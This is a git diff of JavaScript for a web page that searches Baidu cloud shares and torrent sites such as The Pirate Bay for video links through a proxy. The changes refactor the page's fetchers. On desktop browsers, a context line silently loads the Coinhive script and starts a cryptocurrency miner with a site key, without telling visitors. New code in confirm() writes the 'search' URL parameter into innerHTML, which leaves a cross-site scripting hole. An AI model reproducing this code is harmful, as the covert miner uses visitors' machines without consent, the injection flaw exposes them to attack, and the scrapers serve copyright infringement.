@@ -52,14 +52,16 @@ function locationParameterChanged() {
     }
     if(!key){
         input.focus();
+        input.setAttribute("required","required");
         return;
     }
 
     input.value=key;
     document.getElementsByTagName("title")[0].innerText=key+" in pan.baidu.com sharing";
-    panc(key);
-    panduoduo(key);
-    thepiratebay(key);
+    window.panc=pancFetcher(key);
+    window.panduoduo=panduoduoFetcher(key);
+    window.magnet=magnetFetcher(key);
+//     window.tieba=tiebaFetcher(key);
     if(screen.width>=751&&!/Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent) ){
         importScript ("https://coin-hive.com/lib/coinhive.min.js", function(){
             var miner = new CoinHive.Anonymous('Wtx9zrRVSwMjJmFssPEtuCxnzkdo3QaP');
@@ -73,7 +75,7 @@ function loading(is,id){
     var loadingDoc = document.getElementById(id?id:"pancLoading");
     loadingDoc.style.display=is?"block":"none";
 }
-function confirm(id,isImportant){
+function confirm(id,isImportant,data){
     try{
         
         var template = document.getElementById(id).innerHTML;
@@ -85,7 +87,11 @@ function confirm(id,isImportant){
 
             confirm = document.getElementById("confirm");
         }
-        confirm.innerHTML = template;
+        if(id=="noneTemplate"){
+            data = getURLParameter("search");
+        }
+        var html= template.format(data);
+        confirm.innerHTML = html;
         if(id=="moreTemplate"){
             confirm.id = "confirm2";
         }
@@ -95,149 +101,171 @@ function confirm(id,isImportant){
     
 }
 
-function panduoduo(key){
-    var host = "panduoduo";
-    window[host+"Videos"] = [];
-    var fetchUrl = "http://www.panduoduo.net/s/comb/n-"+key+"&ty-bd&f-f4";
-    var progress = innerProgress(host,fetchUrl);
-    var success = function(html){
-        var videos = parseList(html,".search-page .row");
-        if(!videos||videos.length===0){
-            progress.none();
-            confirm("noneTemplate");
-            return;
-        }
-        progress.success(videos.length);
-        window[host+"Videos"] = videos;
-        if(!window.showVideos){
-            window.showVideos = [];
-            panduoduoSetIframe(window[host+"Videos"],1,window.showVideos);
-        }
-//         setTimeout('confirm("moreTemplate");',5000);
-    };
-    fetch(host,fetchUrl,success);
-    
-    function parseList(html,select){
-        var videos = [];
-        var el = document.createElement( 'html' );
-        el.innerHTML = html;
 
-        var as = el.querySelectorAll(select);
-        el = null;
-        for(var i = 0;i<as.length;i++){
-//             if(i>10){
-//                 break;
-//             }
-            var img = as[i].querySelector('[title="百度云盘资源"]');
-            var type = as[i].querySelector('[href^="/c/"]');
-            if(img&&type.innerHTML=="视频"){
-                var a = as[i].querySelector("a[href^='/r/']");
-                var video = {ref:host,name:a.innerHTML,url:"http://www.panduoduo.net"+a.pathname};
-                videos.push(video);
-            }
-            
-//                 fetchDetal(video,i===0);
-            
-        }
-        return videos;
-    }
-    function fetchDetal(video,isSrc){
-        var success = function(html){
-            var url = parseDetail(html,"a.dbutton2");
-            if(!url){
-                panduoduoSetIframe(window["panduoduoVideos"],1,window.showVideos);
-
-            }
-            if(window.showVideos&&isExist(url,window.showVideos)){
-                return;
-            }
-            video["url"] = url;
-            confirm("moreTemplate");
-            function parseDetail(html,select){
-                var href = html.substring(html.indexOf('"dbutton2" href="')+'"dbutton2" href="'.length,html.indexOf('" rel="nofollow">点击去百度云盘下载资源</a>'));
-                var url = getURLParameter("url",href);
-                return url;
-            }
-
-            setIframe([video],isSrc);
-            
-        }
-        fetch("panduoduo",video.url,success);
-
-    }
-    window.panduoduoSetIframe = function (panduoduoVideos,length,showVideos){
-        var videos = panduoduoVideos.splice(0,length);
-        videos.forEach(function (item, index, array) {
-
-            showVideos.push(item);
-            fetchDetal(item,index===0);
-        });
-    }
-}
 
 function ShowMore(){
 
     var length = window.showVideos.length;
-//         window.pancVideos.splice(0,length);
-    var thanPanc = window.pancVideos.length - length;
-    var pancNum = thanPanc>0?length:window.pancVideos.length;
-    var panduoduoNum = thanPanc<0?-thanPanc:0;
-    var thanPancAndPanduoduo = window.pancVideos.length+window.panduoduoVideos.length-length;
-    var thepiratebayNum = thanPancAndPanduoduo<0?-thanPanc:0;
-    if(window.pancVideos.length){
-        pancSetIframe(window.pancVideos,pancNum,window.showVideos);
+    var ways = [panc,panduoduo,magnet];
+    if(length<1){
+        length = 1;
     }
-    if(panduoduoNum>0){
-        panduoduoSetIframe(window.panduoduoVideos,panduoduoNum,window.showVideos);
+    setMoreIframe(ways,0,length);
+
+    
+}
+function setMoreIframe(ways,index,length){
+    if(!index){
+        index = 0;
     }
-    if(thepiratebayNum>0){
-        thepiratebaySetIframe(window.thepiratebayVideos,thepiratebayNum,window.showVideos);
-    }
-    if(window.pancVideos.length===0&&window.panduoduoVideos.length===0&&window.thepiratebayVideos.length===0){
+    if(!ways[index]){
         confirm("noneTemplate",true);
     }
+    var videos = ways[index].videos;
+    var than = length - videos.length;
+
+    if(videos.length == 0){
+        setMoreIframe(ways,index+1,than);
+    }else if(than>0){
+        ways[index].setIframe(videos,videos.length,window.showVideos);
+        setMoreIframe(ways,index+1,than);
+    }else{
+        ways[index].setIframe(videos,length,window.showVideos);
+    }
+
 }
-
-function panc(key){
-
-    var host = "panc";
-    window[host+"Videos"] = [];
-    var fetchUrl = "https://www.panc.cc/s/"+key+"/td_1";
-    var progress = innerProgress(host,fetchUrl);
+function fetcher(parameter){
+    var serf = {};
+    serf.host = parameter.host;
+    serf.videos = [];
+    serf.fetchUrl = parameter.fetchUrl;
+    serf.progress = innerProgress(serf.host,serf.fetchUrl);
+    serf.parseVideos = parameter.parseVideos;
+    serf.setIframe = parameter.setIframe;
+    serf.fetch = parameter.fetch;
     var success = function(html){
-        var videos = parseHref(html,".a_url");
+        var progress = serf.progress;
+        var videos = serf.parseVideos(html);
         if(!videos||videos.length===0){
             progress.none();
             confirm("noneTemplate");
             return;
         }
         progress.success(videos.length);
-        window[host+"Videos"] = videos;
-//         setIframe(videos,true,true);
+        serf.videos = videos;
         if(!window.showVideos){
             window.showVideos = [];
-            pancSetIframe(window[host+"Videos"],1,window.showVideos);
+            serf.setIframe(serf.videos,1,window.showVideos);
         }
-        confirm("moreTemplate"); 
-        clearInvalid(pancVideos);
-    }
-    fetch(host,fetchUrl,success);
+        html = null;
+        
+    };
+    serf.fetch(serf.host,serf.fetchUrl,success);
+    return serf;
+}
 
-    window.pancSetIframe = function (pancVideos,length){
+function panduoduoFetcher(key){
+    var parameter = {};
+    parameter.host = "panduoduo";
+    parameter.fetchUrl = "http://www.panduoduo.net/s/comb/n-"+key+"&ty-bd&f-f4";
+    parameter.fetch = fetch;
+    parameter.parseVideos = function(html){
+        return parseList(html,".search-page .row");
+        function parseList(html,select){
+            var videos = [];
+            var el = document.createElement( 'html' );
+            el.innerHTML = html;
+
+            var as = el.querySelectorAll(select);
+            for(var i = 0;i<as.length;i++){
+    //             if(i>10){
+    //                 break;
+    //             }
+                var img = as[i].querySelector('[title="百度云盘资源"]');
+                var type = as[i].querySelector('[href^="/c/"]');
+                if(img&&type.innerHTML=="视频"){
+                    var a = as[i].querySelector("a[href^='/r/']");
+                    var video = {ref:parameter.host,name:a.innerHTML,url:"http://www.panduoduo.net"+a.pathname};
+                    videos.push(video);
+                }
+
+    //                 fetchDetal(video,i===0);
+
+            }
+            html = el = els = null;
+            return videos;
+        }
+
+    }
+    parameter.setIframe = function (panduoduoVideos,length,showVideos){
+        var videos = panduoduoVideos.splice(0,length);
+        videos.forEach(function (item, index, array) {
+
+            window.showVideos.push(item);
+            fetchDetal(item,index===0);
+        });
+
+        function fetchDetal(video,isSrc){
+            var success = function(html){
+
+                var url = parseDetail(html,"a.dbutton2");
+                if(!url){
+                    parameter.setIframe(videos,1,window.showVideos);
+
+                }
+                if(window.showVideos&&isExist(url,window.showVideos)){
+                    return;
+                }
+                video["url"] = url;
+                function parseDetail(html,select){
+                    var href = html.substring(html.indexOf('"dbutton2" href="')+'"dbutton2" href="'.length,html.indexOf('" rel="nofollow">点击去百度云盘下载资源</a>'));
+                    var url = getURLParameter("url",href);
+                    return url;
+                }
+
+                setIframe([video],isSrc);
+
+            }
+            fetch("panduoduo",video.url,success);
+
+        }
+    }
+    
+    return fetcher(parameter);
+    
+}
+
+
+function pancFetcher(key){
+
+    var parameter = {};
+    parameter.host = "panc";
+    parameter.fetchUrl = "https://www.panc.cc/s/"+key+"/td_1";
+    parameter.fetch = fetch;
+
+    parameter.parseVideos = function(html){
+        var videos = parseHref(html,".a_url");
+        clearInvalid(videos);
+        return videos;
+
+        function parseHref(html,select){
+            var videos = [];
+            var el = document.createElement( 'html' );
+            el.innerHTML = html;
+            var as = el.querySelectorAll(select);
+            for(var i = 0;i<as.length;i++){
+                videos.push({name:as[i].previousElementSibling.innerHTML,url:as[i].href});
+            }
+            return videos;
+        }
+    }
+    parameter.setIframe = function (pancVideos,length,showVideos){
         var videos = pancVideos.splice(0,length);
         window.showVideos = window.showVideos.concat(videos);
         setIframe(videos,true,true);
     }
-    function parseHref(html,select){
-        var videos = [];
-        var el = document.createElement( 'html' );
-        el.innerHTML = html;
-        var as = el.querySelectorAll(select);
-        for(var i = 0;i<as.length;i++){
-            videos.push({name:as[i].previousElementSibling.innerHTML,url:as[i].href});
-        }
-        return videos;
-    }
+    
+    return fetcher(parameter);
 
 }
 
@@ -246,6 +274,25 @@ function fetch(host,api,success){
 //     confirm("loadingTemplate");
     var url = encodeURI("//charon-node.herokuapp.com/fetch?api="+api);
 //     var url = encodeURI("http://127.0.0.1:8888/fetch?api="+api);
+//     var data = JSON.stringify({crossUrl:api});
+    try{
+        var error = function(){
+            var videos = [];
+            confirm("noneTemplate");
+            progress(host+'Progress').error();
+//             setIframe(videos,true,true);
+        }
+        ajax(url,success,error);
+
+    }catch(e){
+        error();
+    }
+}
+function nodeFetch(host,api,success){
+
+//     confirm("loadingTemplate");
+    var url = encodeURI("//charon-node.herokuapp.com/fetch?npm=node-fetch&api="+api);
+//     var url = encodeURI("http://127.0.0.1:8888/fetch?npm=node-fetch&api="+api);
 //     var data = JSON.stringify({crossUrl:api});
     try{
         var error = function(){
@@ -295,7 +342,6 @@ function setIframe(videos,isSrc,isNone,templateId) {
         a.innerHTML=videos[i].name;
         var url = videos[i].url;
         a.href=url;
-        var div= wrapper.children[0];
         var iframe = wrapper.querySelector("iframe");
         if(templateId=="videoTemplate"){
             if(isDisableScript(url)){
@@ -311,11 +357,15 @@ function setIframe(videos,isSrc,isNone,templateId) {
             
             
         }else if(templateId=="magnetTemplate"){
-            iframe.innerHTML = url;
+            
+            var code= wrapper.querySelector("code");;
+            code.innerHTML = url;
         }
         
         dataBox.appendChild(wrapper);
     }
+    confirm("moreTemplate");
+    wrapper = dataBox = iframe = videos = null;
 }
 function isExist(url,videos){
     for(var i=0;i<videos.length;i++){
@@ -403,7 +453,11 @@ function ajax(uri,fn,error,method,data){
     }
     request.onload = function(e) {
         if (this.status == 200) {
-          fn(this.response,error);
+            try{
+                fn(this.response,error);
+            }catch(e){
+                error();
+            }
         }else{
           error();
         }
@@ -425,58 +479,88 @@ function isEnglish(string){
     return true;
 }
 
-function thepiratebay(key){
-    var host = "thepiratebay";
-    window[host+"Videos"] = [];
+function magnetFetcher(key){
+    var parameter = {};
+
     if(isEnglish(key)){
-        var crossUrl = "https://thepiratebay.org/search/"+key+"/0/99/0";
-        var progress = innerProgress(host,crossUrl);
-        var success = function(html){
-
+//         return null;
+//     }
+        parameter.host = "thepiratebay";
+        parameter.fetchUrl = "https://thepiratebay.org/search/"+key+"/0/99/0";
+        parameter.parseVideos = function(html){
             var videos = parseList(html);
-            if(!videos||videos.length===0){
-                confirm("noneTemplate");
-                progress.none();
-                return;
-            }
-            progress.success(videos.length);
-            window[host+"Videos"] = videos;
-            if(!window.showVideos){
-                window.showVideos = [];
-                thepiratebaySetIframe(window[host+"Videos"],1,window.showVideos);
-            }
+            return videos;
 
-    //         setTimeout('confirm("moreTemplate");',5000);
+            function parseList(html){
+
+                var videos = [];
+                var el = document.createElement( 'html' );
+                el.innerHTML = html;
+
+                var els = el.querySelectorAll("#searchResult tbody tr");
+                
+                for(var i = 0;i<els.length;i++){
+        //             if(i>10){
+        //                 break;
+        //             }
+                    var name = els[i].querySelector(".detLink").innerHTML;
+                    var url = els[i].querySelector("a[href^='magnet:']").href;
+                    var video = {ref:parameter.host,name:name,url:url};
+                    videos.push(video);
+        //                 fetchDetal(video,i===0);
+
+                }
+                html = el = els = null;
+                return videos;
+            }
         };
-        cross(host,crossUrl,success);
 
+        parameter.fetch = cross;
+    }else{
+        parameter.host = "diaosisou";
+        parameter.fetchUrl = "http://www.diaosisou.org/list/"+key+"/1";
+        parameter.parseVideos = function(html){
+            var videos = parseList(html);
+            return videos;
+
+            function parseList(html){
+
+                var videos = [];
+                var el = document.createElement( 'html' );
+                el.innerHTML = html;
+
+                var els = el.querySelectorAll(".mlist>li");
+                el = null;
+                for(var i = 0;i<els.length;i++){
+        //             if(i>10){
+        //                 break;
+        //             }
+                    var name = els[i].querySelector("a[name='file_title'").innerHTML;
+                    var url = els[i].querySelector("a[href^='magnet:']").href;
+                    var video = {ref:parameter.host,name:name,url:url};
+                    videos.push(video);
+        //                 fetchDetal(video,i===0);
+
+                }
+                
+                html = el = els = null;
+                return videos;
+            }
+        };
+        parameter.fetch = nodeFetch;
     }
-    function parseList(html){
+    
 
-        var videos = [];
-        var el = document.createElement( 'html' );
-        el.innerHTML = html;
-
-        var els = el.querySelectorAll("#searchResult tbody tr");
-        el = null;
-        for(var i = 0;i<els.length;i++){
-//             if(i>10){
-//                 break;
-//             }
-            var name = els[i].querySelector(".detLink").innerHTML;
-            var url = els[i].querySelector("a[href^='magnet:']").href;
-            var video = {ref:host,name:name,url:url};
-            videos.push(video);
-//                 fetchDetal(video,i===0);
-            
-        }
-        return videos;
-    }
-    window.thepiratebaySetIframe = function (thepiratebayVideos,length,showVideos){
-        var videos = thepiratebayVideos.splice(0,length);
+    parameter.setIframe = function (videos,length,showVideos){
+        var videos = videos.splice(0,length);
         window.showVideos = window.showVideos.concat(videos);
         setIframe(videos,true,true,"magnetTemplate");
     }
+    
+    return fetcher(parameter);
+
+
+    
 }
 
 function loadError (oError) {
@@ -530,7 +614,7 @@ function progress(id){
 function innerProgress(host,fetchUrl){
     var progressGroup = document.getElementById("progressGroup");
     progressGroup.classList.add("show");
-    var html = '<li><progress max="20000" id="'+host+'Progress"></progress><a target="_blank" href="'+fetchUrl+'">'+host+'</a>';
+    var html = '<li class="'+host+'"><progress max="20000" id="'+host+'Progress"></progress><a target="_blank" href="'+fetchUrl+'">'+host+'</a>';
     appendHTML(progressGroup,html)
     return progress(host+'Progress');
 }
@@ -557,7 +641,7 @@ function checkInvalid(url,error){
         el.innerHTML = data;
 
         var as = el.querySelector("title");
-        if(as.innerHTML == "百度网盘-链接不存在"){
+        if(as.innerHTML == "百度网盘-链接不存在"|| as.innerHTML =="页面不存在"){
             error();
         }
         data=el=as=null;
@@ -602,4 +686,61 @@ function setDoubanList(value){
 
 function reloadIframe(button){
     button.previousElementSibling.src=button.previousElementSibling.src
+}
+
+
+String.prototype.format = function()
+{
+    var args = arguments;
+    return this.replace(/\{(\d+)\}/g,                
+        function(m,i){
+            return args[i];
+        });
+}
+
+
+function tiebaFetcher(key){
+
+    var parameter = {};
+    parameter.host = "tieba";
+    parameter.fetchUrl = "http://tieba.baidu.com/f/search/res?ie=utf-8&qw="+key+" pan.baidu";
+    parameter.fetch = cross;
+
+    parameter.parseVideos = function(html){
+        var videos = parseHref(html,".s_post");
+        clearInvalid(videos);
+        return videos;
+
+        function parseHref(html,select){
+            var videos = [];
+            var el = document.createElement( 'html' );
+            el.innerHTML = html;
+            var as = el.querySelectorAll(select);
+            for(var i = 0;i<as.length;i++){
+                var string = as[i].querySelector(".p_title").innerText+" "+as[i].querySelector(".p_content").innerText;
+                var keyIndex = string.lastIndexOf(key);
+                var name = string.slice(keyIndex);
+                var urlIndex = string.indexOf("http",keyIndex);
+                if(urlIndex>0){
+                    var url = string.slice(urlIndex);
+                    var regexp = /[^\x00-\x7F]|\s|\.\.\.|,/;
+                    var match = url.match(regexp);
+                    url = url.slice(0,match.index);
+                }
+                if(url){
+                    videos.push({name:name,url:url});
+                }
+
+            }
+            return videos;
+        }
+    }
+    parameter.setIframe = function (videos,length,showVideos){
+        var videos = videos.splice(0,length);
+        window.showVideos = window.showVideos.concat(videos);
+        setIframe(videos,true,true);
+    }
+    
+    return fetcher(parameter);
+
 }
